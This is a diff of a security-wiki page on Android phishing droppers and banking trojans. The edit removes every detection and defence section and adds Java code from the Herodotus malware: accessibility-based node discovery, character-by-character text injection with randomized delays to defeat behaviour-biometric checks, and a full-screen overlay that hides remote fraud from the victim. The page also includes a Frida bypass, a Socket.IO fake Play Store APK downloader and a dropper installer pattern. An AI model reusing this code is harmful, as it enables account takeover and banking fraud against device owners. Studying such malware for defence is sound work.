@@ -47,25 +47,21 @@
    * Plain HTTP, often on port 80 with HOST header like `api.<phishingdomain>.com`.
    * `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (no TLS → easy to spot).
 
-## Defensive Testing / Red-Team Tips
+## Red-Team Tips
 
 * **Dynamic Analysis Bypass** – During malware assessment, automate the invitation code phase with Frida/Objection to reach the malicious branch.
 * **Manifest vs. Runtime Diff** – Compare `aapt dump permissions` with runtime `PackageManager#getRequestedPermissions()`; missing dangerous perms is a red flag.
 * **Network Canary** – Configure `iptables -p tcp --dport 80 -j NFQUEUE` to detect unsolid POST bursts after code entry.
 * **mobileconfig Inspection** – Use `security cms -D -i profile.mobileconfig` on macOS to list `PayloadContent` and spot excessive entitlements.
 
-## Blue-Team Detection Ideas
-
-* **Certificate Transparency / DNS Analytics** to catch sudden bursts of keyword-rich domains.
-* **User-Agent & Path Regex**: `(?i)POST\s+/(check|upload)\.php` from Dalvik clients outside Google Play.
-* **Invite-code Telemetry** – POST of 6–8 digit numeric codes shortly after APK install may indicate staging.
-* **MobileConfig Signing** – Block unsigned configuration profiles via MDM policy.
-
 ## Useful Frida Snippet: Auto-Bypass Invitation Code
 
-```python
-# frida -U -f com.badapp.android -l bypass.js --no-pause
-# Hook HttpURLConnection write to always return success
+<details>
+<summary>Frida: auto-bypass invitation code</summary>
+
+```javascript
+// frida -U -f com.badapp.android -l bypass.js --no-pause
+// Hook HttpURLConnection write to always return success
 Java.perform(function() {
   var URL = Java.use('java.net.URL');
   URL.openConnection.implementation = function() {
@@ -81,6 +77,8 @@ Java.perform(function() {
   };
 });
 ```
+
+</details>
 
 ## Indicators (Generic)
 
@@ -206,19 +204,13 @@ public void onMessageReceived(RemoteMessage msg){
 }
 ```
 
-### Hunting patterns and IOCs
+### Indicators/IOCs
 - APK contains secondary payload at `assets/app.apk`
 - WebView loads payment from `gate.htm` and exfiltrates to `/addup.php`
 - SMS exfiltration to `/addsm.php`
 - Shortlink-driven config fetch (e.g., `rebrand.ly/*`) returning CSV endpoints
 - Apps labelled as generic “Update/Secure Update”
 - FCM `data` messages with a `_type` discriminator in untrusted apps
-
-### Detection & defence ideas
-- Flag apps that instruct users to disable network during install and then side-load a second APK from `assets/`.
-- Alert on the permission tuple: `READ_CONTACTS` + `READ_SMS` + `SEND_SMS` + WebView-based payment flows.
-- Egress monitoring for `POST /addup.php|/addsm.php` on non-corporate hosts; block known infrastructure.
-- Mobile EDR rules: untrusted app registering for FCM and branching on a `_type` field.
 
 ---
 
@@ -227,6 +219,9 @@ public void onMessageReceived(RemoteMessage msg){
 Attackers increasingly replace static APK links with a Socket.IO/WebSocket channel embedded in Google Play–looking lures. This conceals the payload URL, bypasses URL/extension filters, and preserves a realistic install UX.
 
 Typical client flow observed in the wild:
+
+<details>
+<summary>Socket.IO fake Play downloader (JavaScript)</summary>
 
 ```javascript
 // Open Socket.IO channel and request payload
@@ -248,15 +243,12 @@ socket.on("downloadComplete", () => {
 });
 ```
 
+</details>
+
 Why it evades simple controls:
 - No static APK URL is exposed; payload is reconstructed in memory from WebSocket frames.
 - URL/MIME/extension filters that block direct .apk responses may miss binary data tunneled via WebSockets/Socket.IO.
 - Crawlers and URL sandboxes that don’t execute WebSockets won’t retrieve the payload.
-
-Hunting and detection ideas:
-- Web/network telemetry: flag WebSocket sessions that transfer large binary chunks followed by creation of a Blob with MIME application/vnd.android.package-archive and a programmatic `<a download>` click. Look for client strings like socket.emit('startDownload'), and events named chunk, downloadProgress, downloadComplete in page scripts.
-- Play-store spoof heuristics: on non-Google domains serving Play-like pages, hunt for Google Play UI strings such as http.html:"VfPpkd-jY41G-V67aGc", mixed-language templates, and fake “verification/progress” flows driven by WS events.
-- Controls: block APK delivery from non-Google origins; enforce MIME/extension policies that include WebSocket traffic; preserve browser safe-download prompts.
 
 See also WebSocket tradecraft and tooling:
 
@@ -273,6 +265,9 @@ The RatOn banker/RAT campaign (ThreatFabric) is a concrete example of how modern
 Attackers present a WebView pointing to an attacker page and inject a JavaScript interface that exposes a native installer. A tap on an HTML button calls into native code that installs a second-stage APK bundled in the dropper’s assets and then launches it directly.
 
 Minimal pattern:
+
+<details>
+<summary>Stage-1 dropper minimal pattern (Java)</summary>
 
 ```java
 public class DropperActivity extends Activity {
@@ -302,6 +297,8 @@ public class DropperActivity extends Activity {
   }
 }
 ```
+
+</details>
 
 HTML on the page:
 
@@ -421,15 +418,76 @@ Background: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new
 - Comms/Recon: `update_device`, `send_sms`, `replace_buffer`, `get_name`, `add_contact`
 - NFC: `nfs`, `nfs_inject`
 
-### Detection & defence ideas (RatOn-style)
-- Hunt for WebViews with `addJavascriptInterface()` exposing installer/permission methods; pages ending in “/access” that trigger Accessibility prompts.
-- Alert on apps that generate high-rate Accessibility gestures/clicks shortly after being granted service access; telemetry that resembles Accessibility node dumps sent to C2.
-- Monitor Device Admin policy changes in untrusted apps: `lockNow`, password expiration, keyguard feature toggles.
-- Alert on MediaProjection prompts from non-corporate apps followed by periodic frame uploads.
-- Detect installation/launch of an external NFC-relay app triggered by another app.
-- For banking: enforce out-of-band confirmations, biometrics-binding, and transaction-limits resistant to on-device automation.
+### Accessibility-driven ATS anti-detection: human-like text cadence and dual text injection (Herodotus)
+
+Threat actors increasingly blend Accessibility-driven automation with anti-detection tuned against basic behaviour biometrics. A recent banker/RAT shows two complementary text-delivery modes and an operator toggle to simulate human typing with randomized cadence.
+
+- Discovery mode: enumerate visible nodes with selectors and bounds to precisely target inputs (ID, text, contentDescription, hint, bounds) before acting.
+- Dual text injection:
+  - Mode 1 – `ACTION_SET_TEXT` directly on the target node (stable, no keyboard);
+  - Mode 2 – clipboard set + `ACTION_PASTE` into the focused node (works when direct setText is blocked).
+- Human-like cadence: split the operator-provided string and deliver it character-by-character with randomized 300–3000 ms delays between events to evade “machine-speed typing” heuristics. Implemented either by progressively growing the value via `ACTION_SET_TEXT`, or by pasting one char at a time.
+
+<details>
+<summary>Java sketch: node discovery + delayed per-char input via setText or clipboard+paste</summary>
+
+```java
+// Enumerate nodes (HVNCA11Y-like): text, id, desc, hint, bounds
+void discover(AccessibilityNodeInfo r, List<String> out){
+  if (r==null) return; Rect b=new Rect(); r.getBoundsInScreen(b);
+  CharSequence id=r.getViewIdResourceName(), txt=r.getText(), cd=r.getContentDescription();
+  out.add(String.format("cls=%s id=%s txt=%s desc=%s b=%s",
+      r.getClassName(), id, txt, cd, b.toShortString()));
+  for(int i=0;i<r.getChildCount();i++) discover(r.getChild(i), out);
+}
+
+// Mode 1: progressively set text with randomized 300–3000 ms delays
+void sendTextSetText(AccessibilityNodeInfo field, String s) throws InterruptedException{
+  String cur = "";
+  for (char c: s.toCharArray()){
+    cur += c; Bundle b=new Bundle();
+    b.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, cur);
+    field.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, b);
+    Thread.sleep(300 + new java.util.Random().nextInt(2701));
+  }
+}
+
+// Mode 2: clipboard + paste per-char with randomized delays
+void sendTextPaste(AccessibilityService svc, AccessibilityNodeInfo field, String s) throws InterruptedException{
+  field.performAction(AccessibilityNodeInfo.ACTION_FOCUS);
+  ClipboardManager cm=(ClipboardManager) svc.getSystemService(Context.CLIPBOARD_SERVICE);
+  for (char c: s.toCharArray()){
+    cm.setPrimaryClip(ClipData.newPlainText("x", Character.toString(c)));
+    field.performAction(AccessibilityNodeInfo.ACTION_PASTE);
+    Thread.sleep(300 + new java.util.Random().nextInt(2701));
+  }
+}
+```
+
+</details>
+
+Blocking overlays for fraud cover:
+- Render a full-screen `TYPE_ACCESSIBILITY_OVERLAY` with operator-controlled opacity; keep it opaque to the victim while remote automation proceeds underneath.
+- Commands typically exposed: `opacityOverlay <0..255>`, `sendOverlayLoading <html/url>`, `removeOverlay`.
+
+Minimal overlay with adjustable alpha:
+
+```java
+View v = makeOverlayView(ctx); v.setAlpha(0.92f); // 0..1
+WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
+  MATCH_PARENT, MATCH_PARENT,
+  WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
+  WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
+  WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
+  PixelFormat.TRANSLUCENT);
+wm.addView(v, lp);
+```
+
+Operator control primitives often seen: `BACK`, `HOME`, `RECENTS`, `CLICKTXT`/`CLICKDESC`/`CLICKELEMENT`/`CLICKHINT`, `TAP`/`SWIPE`, `NOTIFICATIONS`, `OPNPKG`, `VNC`/`VNCA11Y` (screen sharing).
 
 ## References
+
+- [New Android Malware Herodotus Mimics Human Behaviour to Evade Detection](https://www.threatfabric.com/blogs/new-android-malware-herodotus-mimics-human-behaviour-to-evade-detection)
 
 - [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
 - [Luban – Android image compression library](https://github.com/Curzibn/Luban)
